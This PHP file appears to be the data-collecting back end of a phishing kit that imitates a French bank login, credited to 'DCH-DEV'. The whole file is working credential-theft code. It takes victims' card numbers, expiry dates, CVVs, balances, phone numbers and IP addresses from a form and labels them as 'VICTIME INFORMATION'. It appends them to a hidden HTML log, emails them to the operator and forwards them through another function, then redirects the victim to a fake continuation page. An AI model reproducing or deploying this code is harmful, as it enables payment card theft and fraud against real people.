<?php 
//Array ( [cart] => Array ( [0] => 4444444444 [1] => 55555555555 [2] => 88888888 ) [exp] => Array ( [0] => 09/2022 [1] => 09/2019 [2] => 09/2020 ) [cvv] => Array ( [0] => 400 [1] => 500 [2] => 800 ) )
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');


$semiyadcard = $_POST['semiyadcard'];

$blance = $_POST['blance'];
$ShortName = $_POST['ShortName'];
$BankClientNamex = $_POST['BankClientNamex'];

$cart0 = $_POST['cart0'];
$cart1 = $_POST['cart1'];

$cart = $_POST['cart'];

$date0 = $_POST['date0'];
$exp = $_POST['exp'];

$cvv = $_POST['cvv'];

 $ip = $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');
$DCH_MESSAGE = '';
for ($i=0; $i < count($cart); $i++) { 

/*	
	echo $semiyadcard[$i] ;
	echo "<br>";
	echo $exp[$i] ;
	echo "<br>";

	echo $cvv[$i] ;
	echo "<br>";

	echo $blance[$i] ;
	echo "<br>";

	echo $ShortName[$i] ;
	echo "<br>";
echo $cart[$i] ;
	echo "&nbsp;&nbsp";

	echo $cart0[$i] ;
	echo "&nbsp;&nbsp";
	echo $cart1[$i] ;
	echo "&nbsp;&nbsp";
		echo $date0[$i] ;
	echo "<hr>";
	echo "<br>";
*/
	$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>INFO USER CARD ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [TELE] = <font style='color:#ba0000;'>".$ShortName[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TELE] = <font style='color:#ba0000;'>".$semiyadcard[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD] = <font style='color:#ba0000;'>".$cart0[$i]." - ".$cart[$i]." - ".$cart1[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [DATE] = <font style='color:#ba0000;'>".$date0[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [EXP ] = <font style='color:#ba0000;'>".$exp[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ] = <font style='color:#ba0000;'>".$cvv[$i]."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BLC ] = <font style='color:#ba0000;'>".$blance[$i]."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY DCH-DEV </font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";

//echo $DCH_MESSAGE;
//

}


$khraha = fopen("./samiRzL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
functiondilih(strip_tags($DCH_MESSAGE));
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: Dch-Dev<cantact>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../Using_continuar.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");



 ?>